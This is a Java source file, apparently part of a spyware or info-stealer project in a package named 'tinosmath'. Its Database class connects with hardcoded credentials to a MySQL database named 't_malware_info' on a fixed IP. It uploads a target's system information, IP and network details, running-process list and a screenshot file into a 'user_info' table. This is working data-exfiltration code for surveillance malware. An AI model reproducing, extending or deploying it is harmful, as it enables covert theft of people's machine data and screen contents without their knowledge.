/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

package tinosmath;

import com.mysql.jdbc.Connection;
import com.mysql.jdbc.PreparedStatement;
import com.mysql.jdbc.Statement;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.Date;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.text.SimpleDateFormat;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author Tinotenda
 */
public class Database {
    
  private final  String user="Tinotenda Mhlanga";
   private final  String password="tino123";
   String ipLocal=" 192.168.65.128";
   private String url="jdbc:mysql://" + ipLocal + ":3306/t_malware_info";
   private Connection conn;
  private Statement stat;
  private PreparedStatement stat1;
   public void ConnctDb(){
      try {
          Class.forName("com.mysql.jdbc.Driver");

          try {
              conn=(Connection)DriverManager.getConnection(url,user,password);
          } catch (SQLException ex) {
              Logger.getLogger(Database.class.getName()).log(Level.SEVERE, null, ex);
          }
          
          
      } catch (ClassNotFoundException ex) {
          Logger.getLogger(Database.class.getName()).log(Level.SEVERE, null, ex);
      }
   }
    public void insertData(String  system_info, String ip_info , String list_processes,String network_info){
      try {
          stat=(Statement)conn.createStatement();
          String sql="INSERT INTO user_info (system_info,ip_info,list_processes,network_info,date,image) values(?,?,?,?,?,?); ";
          stat1=(PreparedStatement)conn.prepareStatement(sql);
          FileInputStream f;
          byte[]buf;
          try {
              f=new FileInputStream(new File("Screenshot.png"));
              ByteArrayOutputStream bos=new ByteArrayOutputStream();
              buf=new byte[1024];
              try {
                  for(int readNum;(readNum=f.read(buf))!=-1;){
                      bos.write(buf,0,readNum);
                      
                  }
                  byte[]image=bos.toByteArray();
                  stat1.setString(1, system_info);
                  stat1.setString(2, ip_info);
                  stat1.setString(3, list_processes);
                  stat1.setString(4, network_info); 
                  stat1.setString(5, DateTime());
                  stat1.setBytes(6, image);
                  stat1.executeUpdate();
                  f.close();
                  stat1.close();
                  stat.close();
                  bos.close();
                  conn.close();
                   
                   
                   
              } catch (IOException ex) {
                  Logger.getLogger(Database.class.getName()).log(Level.SEVERE, null, ex);
              }
          } catch (FileNotFoundException ex) {
              Logger.getLogger(Database.class.getName()).log(Level.SEVERE, null, ex);
          }
      } catch (SQLException ex) {
          Logger.getLogger(Database.class.getName()).log(Level.SEVERE, null, ex);
      }
    }

    private String DateTime() {
        Date da=new Date();
        SimpleDateFormat sdf=new SimpleDateFormat("YYYY/MM/dd HH:mm:ss");
        return sdf.format(da);
    }
}